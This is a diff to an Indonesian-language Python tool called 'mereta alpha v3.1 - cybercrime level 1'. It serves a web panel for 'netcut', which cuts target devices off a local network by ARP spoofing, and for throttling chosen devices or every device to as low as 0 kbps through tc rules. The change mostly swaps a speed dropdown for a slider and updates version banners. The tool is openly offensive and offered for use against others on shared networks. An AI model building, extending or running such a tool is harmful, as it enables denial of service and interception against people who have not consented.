@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-mereta alpha v3.0 - cybercrime level 1
-with netcut & speed control - add network & wifi control
+mereta alpha v3.1 - cybercrime level 1
+with netcut & slider speed control - add network & wifi control
 """
 
 import os
@@ -38,7 +38,6 @@ def get_gateway():
         return "192.168.188.1"
 
 def netcut_start(target_ip, duration=60):
-    """potong koneksi target dengan arp spoofing"""
     global netcut_running, netcut_target
     netcut_running = True
     netcut_target = target_ip
@@ -66,29 +65,22 @@ def netcut_stop():
 # ============================================
 
 def set_speed_limit(target_ip, speed_kbps):
-    """limit kecepatan internet target (kbps)"""
     global speed_limit_running
     speed_limit_running = True
     
-    # bersihkan rules lama
     os.system(f"sudo tc qdisc del dev {interface} root 2>/dev/null")
-    
-    # tambah rules baru
     os.system(f"sudo tc qdisc add dev {interface} root handle 1: htb default 30")
     os.system(f"sudo tc class add dev {interface} parent 1: classid 1:1 htb rate {speed_kbps}kbit")
     os.system(f"sudo tc filter add dev {interface} parent 1: protocol ip prio 1 u32 match ip dst {target_ip} flowid 1:1")
     os.system(f"sudo tc filter add dev {interface} parent 1: protocol ip prio 1 u32 match ip src {target_ip} flowid 1:1")
-    
     return True
 
 def remove_speed_limit():
-    """hapus semua limit bandwidth"""
     global speed_limit_running
     speed_limit_running = False
     os.system(f"sudo tc qdisc del dev {interface} root 2>/dev/null")
 
 def apply_speed_to_all(speed_kbps):
-    """limit semua device dalam jaringan (slow internet semua)"""
     os.system(f"sudo tc qdisc del dev {interface} root 2>/dev/null")
     os.system(f"sudo tc qdisc add dev {interface} root handle 1: htb default 30")
     os.system(f"sudo tc class add dev {interface} parent 1: classid 1:1 htb rate {speed_kbps}kbit")
@@ -306,7 +298,7 @@ def get_ip():
         return "127.0.0.1"
 
 # ============================================
-# web server html
+# web server html dengan slider
 # ============================================
 
 html_page = '''<!doctype html>
@@ -314,7 +306,7 @@ html_page = '''<!doctype html>
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>mereta alpha v3</title>
+<title>mereta alpha v3.1</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;}
 body{background:#fff;font-family:'courier new',monospace;font-weight:300;font-size:12px;color:#cc0000;padding:15px;}
@@ -334,13 +326,15 @@ button:hover{background:#cc0000;color:#fff;}
 .footer{margin-top:15px;padding-top:8px;border-top:1px solid #ffcccc;font-size:9px;}
 .status{color:#cc0000;}
 .speed-select{width:120px;}
+.slider{width:100%;margin:10px 0;}
+.speed-value{color:#cc0000;font-weight:bold;}
 </style>
 </head>
 <body>
 <div class="container">
 <div class="header">
-<div class="title">mereta alpha v3</div>
-<div class="subtitle">cybercrime level 1 - netcut + speed control</div>
+<div class="title">mereta alpha v3.1</div>
+<div class="subtitle">cybercrime level 1 - slider speed control</div>
 </div>
 <div class="warning">
 [!] extreme danger - total destruction mode
@@ -358,22 +352,19 @@ button:hover{background:#cc0000;color:#fff;}
 </div>
 
 <div class="section">
-<div class="section-title">> speed control (limit bandwidth)</div>
+<div class="section-title">> speed control (geser slider)</div>
 <select id="speedTarget" class="speed-select">
 <option value="all">semua device</option>
 </select>
-<select id="speedLevel">
-<option value="0">0 kbps (mati total)</option>
-<option value="64">64 kbps (sangat lambat)</option>
-<option value="128">128 kbps (lambat)</option>
-<option value="256">256 kbps (sedang lambat)</option>
-<option value="512">512 kbps (normal lambat)</option>
-<option value="1024">1024 kbps (1 mbps)</option>
-<option value="2048">2048 kbps (2 mbps)</option>
-<option value="5120">5120 kbps (5 mbps)</option>
-<option value="10240">10240 kbps (10 mbps)</option>
-<option value="0">no limit (kencang)</option>
-</select>
+<div style="margin-top:10px;">
+<input type="range" id="speedSlider" class="slider" min="0" max="10240" step="64" value="0">
+</div>
+<div style="display:flex;justify-content:space-between;margin:5px 0;">
+<span>0 kbps (mati)</span>
+<span>5 mbps</span>
+<span>10 mbps</span>
+</div>
+<div>speed: <span id="speedValue" class="speed-value">0</span> kbps (<span id="speedMbps">0</span> mbps)</div>
 <button id="speedApply">apply limit</button>
 <button id="speedRemove">remove limit</button>
 <div id="speedStatus" class="result-area">no limit</div>
@@ -431,6 +422,9 @@ const netcutStart = document.getElementById('netcutStart');
 const netcutStop = document.getElementById('netcutStop');
 const speedApply = document.getElementById('speedApply');
 const speedRemove = document.getElementById('speedRemove');
+const speedSlider = document.getElementById('speedSlider');
+const speedValue = document.getElementById('speedValue');
+const speedMbps = document.getElementById('speedMbps');
 const wifionbtn = document.getElementById('wifionbtn');
 const wifioffbtn = document.getElementById('wifioffbtn');
 const apbtn = document.getElementById('apbtn');
@@ -445,7 +439,6 @@ const stopbtn = document.getElementById('stopbtn');
 const duration = document.getElementById('duration');
 const netcutTarget = document.getElementById('netcutTarget');
 const speedTarget = document.getElementById('speedTarget');
-const speedLevel = document.getElementById('speedLevel');
 const netcutDuration = document.getElementById('netcutDuration');
 const netcutStatus = document.getElementById('netcutStatus');
 const speedStatus = document.getElementById('speedStatus');
@@ -480,6 +473,13 @@ async function loadDevices() {
     }
 }
 
+speedSlider.oninput = function() {
+    let val = this.value;
+    let mbps = (val / 1024).toFixed(1);
+    speedValue.innerText = val;
+    speedMbps.innerText = mbps;
+};
+
 netcutStart.onclick = async () => {
     const target = netcutTarget.value;
     const dur = netcutDuration.value;
@@ -502,14 +502,17 @@ netcutStop.onclick = async () => {
 
 speedApply.onclick = async () => {
     const target = speedTarget.value;
-    const speed = speedLevel.value;
+    const speed = speedSlider.value;
     await fetch(`/api/speed/apply?target=${target}&speed=${speed}`);
-    speedStatus.innerHTML = `<div class="result-line">speed limit: ${speed} kbps untuk ${target}</div>`;
+    speedStatus.innerHTML = `<div class="result-line">speed limit: ${speed} kbps (${(speed/1024).toFixed(1)} mbps) untuk ${target}</div>`;
 };
 
 speedRemove.onclick = async () => {
     await fetch('/api/speed/remove');
     speedStatus.innerHTML = '<div class="result-line">no limit</div>';
+    speedSlider.value = 0;
+    speedValue.innerText = 0;
+    speedMbps.innerText = 0;
 };
 
 wifionbtn.onclick = async () => {
@@ -760,8 +763,8 @@ class handler(BaseHTTPRequestHandler):
 if __name__ == '__main__':
     os.system('clear')
     print('\033[91m╔════════════════════════════════════════════╗')
-    print('║              mereta alpha v3.0                ║')
-    print('║    cybercrime level 1 - netcut + speed        ║')
+    print('║              mereta alpha v3.1                ║')
+    print('║    cybercrime level 1 - slider speed control  ║')
     print('║        add network & wifi control             ║')
     print('╚════════════════════════════════════════════╝\033[0m')
     
@@ -769,7 +772,7 @@ if __name__ == '__main__':
     
     local_ip = get_ip()
     print(f'\n\033[91m[!]\033[0m server: http://{local_ip}:8080')
-    print(f'\033[91m[!]\033[0m fitur: netcut | speed control | add network | wifi on/off | ap mode')
+    print(f'\033[91m[!]\033[0m fitur: netcut | slider speed control | add network | wifi on/off | ap mode')
     print(f'\033[91m[!]\033[0m press ctrl+c to stop\n')
     
     server = HTTPServer(('0.0.0.0', 8080), handler)
